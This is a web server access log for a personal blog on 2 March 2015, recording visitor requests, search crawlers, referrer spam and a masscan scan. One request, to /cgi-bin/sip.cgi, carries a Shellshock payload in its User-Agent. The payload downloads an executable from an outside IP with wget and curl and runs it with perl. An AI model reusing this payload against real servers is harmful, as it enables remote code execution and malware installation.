70.125.136.64 - - [02/Mar/2015:01:20:28 +0000] "GET / HTTP/1.1" 200 1037 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:28 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10388 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:28 +0000] "GET /assets/bundle.js HTTP/1.1" 200 59563 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:28 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:29 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:29 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:29 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
70.125.136.64 - - [02/Mar/2015:01:20:32 +0000] "GET /posts/Deploying_our_Demo_Rails_application HTTP/1.1" 200 1037 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
220.181.108.76 - - [02/Mar/2015:01:42:15 +0000] "GET / HTTP/1.1" 200 1037 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.109 - - [02/Mar/2015:01:46:20 +0000] "GET /assets/bundle.css HTTP/1.1" 200 52546 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.113 - - [02/Mar/2015:01:46:21 +0000] "GET /assets/bundle.js HTTP/1.1" 200 171823 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.80 - - [02/Mar/2015:01:46:22 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.119 - - [02/Mar/2015:01:46:22 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.109 - - [02/Mar/2015:01:46:22 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.116 - - [02/Mar/2015:01:46:23 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.86 - - [02/Mar/2015:01:46:23 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.82 - - [02/Mar/2015:01:46:23 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
208.115.113.89 - - [02/Mar/2015:02:29:02 +0000] "GET /robots.txt HTTP/1.1" 200 2903 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.4.52 - - [02/Mar/2015:02:50:10 +0000] "GET / HTTP/1.1" 200 2903 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
46.119.115.79 - - [02/Mar/2015:03:02:48 +0000] "GET / HTTP/1.1" 200 2903 "http://pornokajf.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Deepnet Explorer)"
46.119.115.79 - - [02/Mar/2015:03:02:48 +0000] "GET / HTTP/1.1" 200 2903 "http://pornokajf.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Deepnet Explorer)"
46.119.115.79 - - [02/Mar/2015:03:02:49 +0000] "GET / HTTP/1.1" 200 2903 "http://pornokajf.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Deepnet Explorer)"
66.249.67.36 - - [02/Mar/2015:03:17:55 +0000] "GET /rss/ HTTP/1.1" 200 1037 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.115.113.89 - - [02/Mar/2015:04:29:08 +0000] "GET / HTTP/1.1" 200 2903 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.4.115 - - [02/Mar/2015:04:47:03 +0000] "GET / HTTP/1.1" 200 2903 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
180.76.4.124 - - [02/Mar/2015:06:47:01 +0000] "GET / HTTP/1.1" 200 2903 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
72.179.144.182 - - [02/Mar/2015:06:57:13 +0000] "GET / HTTP/1.1" 200 1028 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:13 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10388 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:13 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:14 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:14 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:14 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:14 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:06:57:14 +0000] "GET /favicon.ico HTTP/1.1" 404 206 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
64.233.172.142 - - [02/Mar/2015:07:44:57 +0000] "GET / HTTP/1.1" 200 1028 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.252 - - [02/Mar/2015:07:44:57 +0000] "GET / HTTP/1.1" 200 1028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.142 - - [02/Mar/2015:07:44:57 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.252 - - [02/Mar/2015:07:44:57 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.142 - - [02/Mar/2015:07:44:57 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10388 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.134 - - [02/Mar/2015:07:44:57 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10388 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.142 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.252 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.142 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.252 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25"
64.233.172.252 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.142 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.252 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
64.233.172.142 - - [02/Mar/2015:07:44:58 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /posts/Deploying_our_Demo_Rails_application HTTP/1.1" 200 1028 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/bundle.css HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/flagship.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:25 +0000] "GET /assets/adam.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:07:52:31 +0000] "GET / HTTP/1.1" 200 1028 "http://matthewellsworth.com/posts/Deploying_our_Demo_Rails_application" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
66.249.80.118 - - [02/Mar/2015:08:15:44 +0000] "GET / HTTP/1.1" 200 1028 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.80.3 - - [02/Mar/2015:08:15:44 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.80.118 - - [02/Mar/2015:08:15:44 +0000] "GET / HTTP/1.1" 200 1028 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.118 - - [02/Mar/2015:08:15:44 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10388 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.126 - - [02/Mar/2015:08:15:45 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.126 - - [02/Mar/2015:08:15:45 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.126 - - [02/Mar/2015:08:15:45 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.3 - - [02/Mar/2015:08:15:45 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.80.118 - - [02/Mar/2015:08:15:45 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:20:40 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:20:41 +0000] "GET /favicon.ico HTTP/1.1" 404 206 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/flagship.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/adam.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:22:48 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/bundle.css HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/bundle.js HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/flagship.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/adam.otf HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:23:06 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 304 0 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:45 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
72.179.144.182 - - [02/Mar/2015:08:27:46 +0000] "GET /favicon.ico HTTP/1.1" 404 206 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
66.249.67.36 - - [02/Mar/2015:08:28:43 +0000] "GET /rss/ HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
209.236.133.201 - - [02/Mar/2015:08:39:12 +0000] "GET /cgi-bin/sip.cgi HTTP/1.0" 200 2869 "-" "() { :;}; /bin/bash -c \x22cd /var/tmp ; wget http://151.236.44.210/ft.exe ; curl -O http://151.236.44.210/ft.exe;perl ft.exe;perl /var/tmp/ft.exe;perl ft.exe\x22"
180.76.4.179 - - [02/Mar/2015:08:40:02 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
72.179.144.182 - - [02/Mar/2015:08:46:44 +0000] "GET / HTTP/1.1" 200 1025 "http://matthewellsworth.com/posts/Deploying_our_Demo_Rails_application" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
72.179.144.182 - - [02/Mar/2015:08:46:44 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
128.61.240.66 - - [02/Mar/2015:09:51:42 +0000] "GET / HTTP/1.0" 200 2869 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
180.76.4.117 - - [02/Mar/2015:10:51:11 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
109.120.157.179 - - [02/Mar/2015:12:03:12 +0000] "GET / HTTP/1.1" 200 2869 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
109.120.157.179 - - [02/Mar/2015:12:03:12 +0000] "GET / HTTP/1.1" 200 2869 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
109.120.157.179 - - [02/Mar/2015:12:03:13 +0000] "GET / HTTP/1.1" 200 2869 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET / HTTP/1.1" 200 1025 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
79.37.245.156 - - [02/Mar/2015:12:23:11 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
